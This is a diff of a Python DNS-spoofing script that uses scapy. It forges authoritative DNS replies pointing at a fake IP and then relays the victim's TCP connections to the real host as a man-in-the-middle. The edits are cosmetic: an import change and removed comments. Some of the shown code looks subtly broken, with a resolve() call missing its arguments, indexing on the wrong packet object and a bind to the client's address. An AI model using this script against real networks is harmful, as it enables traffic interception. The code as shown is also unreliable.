@@ -1,6 +1,6 @@
 import argparse
 
-import dns.resolver
+from dns import resolver
 from scapy.all import *
 from scapy.layers.dns import DNSRR, DNS
 from scapy.layers.inet import IP, UDP
@@ -33,9 +33,6 @@ import socket
 
 
 def handle_tcp_forwarding(client_socket, client_ip, hostname):
-    # Continuously intercept new connections from the client
-    # and initiate a connection with the host in order to forward data
-
     while True:
         connection, client_address = client_socket.accept()
         print(f"New connection from client {client_address}")
@@ -67,7 +64,6 @@ def handle_tcp_forwarding(client_socket, client_ip, hostname):
             print(f"Sent {len(data)} bytes to client {client_address}")
 
 
-
 def dns_callback(packet, extra_args):
     scapy_packet = IP(packet.get_payload())
     if scapy_packet.haslayer(DNSRR) and scapy_packet:
@@ -77,7 +73,7 @@ def dns_callback(packet, extra_args):
         dns_response = IP(dst=packet[IP].src) / \
                        UDP(dport=packet[UDP].sport, sport=53) / \
                        DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
-                           an=DNSRR(rrname=dns.resolver.resolve(), ttl=10, rdata=extra_args['fake_ip']))
+                           an=DNSRR(rrname=resolver.resolve(), ttl=10, rdata=extra_args['fake_ip']))
 
         send(dns_response, verbose=0)
         client_ip = socket.inet_ntoa(scapy_packet.getlayer(IP).src)
@@ -86,7 +82,6 @@ def dns_callback(packet, extra_args):
         client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         client_socket.bind((client_ip, client_port))
         handle_tcp_forwarding(client_socket, extra_args['fake_ip'], extra_args['target_host'])
-
 
 
 def sniff_and_spoof(source_ip):
